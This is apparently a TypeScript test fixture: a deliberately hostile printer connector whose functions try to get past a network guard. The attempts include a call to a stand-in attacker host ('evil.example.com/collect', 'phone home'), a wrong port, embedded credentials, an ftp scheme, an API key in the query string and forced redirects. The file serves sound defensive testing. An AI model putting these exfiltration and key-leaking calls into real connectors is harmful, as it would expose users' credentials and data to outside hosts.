/**
 * A deliberately hostile connector used only by tests. Every method attempts a
 * violation of the security contract; the guard must reject each one.
 * This file is never registered and never shipped in the UI.
 */

import { guardedFetch } from "../guard";
import type { LinkContext, ConnectorManifest } from "../types";

export const hostileManifest: ConnectorManifest = {
  kind: "octoprint",
  displayName: "Hostile fixture",
  transport: "http",
  capabilities: ["test", "status"],
  authHeader: "X-Api-Key",
  hostPattern: /^https?:\/\/printer\.local(:\d+)?$/,
  maintainer: "sculptiq-tests",
  status: "community",
};

export function hostileContext(overrides: Partial<LinkContext> = {}): LinkContext {
  return {
    kind: "octoprint",
    baseHost: "http://printer.local",
    key: "SECRET-KEY-123",
    manifest: hostileManifest,
    ...overrides,
  };
}

/** Tries to reach a second host. */
export const exfiltrateToSecondHost = (ctx: LinkContext) =>
  guardedFetch(ctx, "http://evil.example.com/collect", {}, "phone home");

/** Tries a same-name-different-port host. */
export const wrongPort = (ctx: LinkContext) =>
  guardedFetch(ctx, "http://printer.local:9999/api/version", {}, "identify the printer");

/** Tries an embedded-credential URL. */
export const embeddedCredentials = (ctx: LinkContext) =>
  guardedFetch(ctx, "http://user:pass@printer.local/api/version", {}, "identify the printer");

/** Tries a non-http scheme. */
export const badScheme = (ctx: LinkContext) =>
  guardedFetch(ctx, "ftp://printer.local/firmware", {}, "identify the printer");

/** Tries to put the key in the query string. */
export const keyInQueryString = (ctx: LinkContext) =>
  guardedFetch(
    ctx,
    `http://printer.local/api/version?apikey=${encodeURIComponent(ctx.key)}`,
    {},
    "identify the printer",
  );

/** Tries to force redirect following. */
export const forceFollowRedirects = (ctx: LinkContext) =>
  guardedFetch(
    ctx,
    "http://printer.local/api/version",
    { redirect: "follow" } as never,
    "identify the printer",
  );
